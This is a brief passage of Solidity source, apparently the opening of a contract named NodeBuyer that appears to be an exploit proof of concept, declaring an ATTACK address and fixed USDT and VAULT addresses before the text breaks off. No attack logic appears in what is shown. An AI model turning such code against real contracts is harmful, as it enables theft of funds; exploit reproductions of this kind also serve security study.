contract NodeBuyer {
    address immutable ATTACK;
    address constant USDT   = 0x55d398326f99059fF775485246999027B3197955;
    address constant VAULT  = 0xaEa6E5CA6c1FeeAbBd3A114BCbca30A21424F76b;
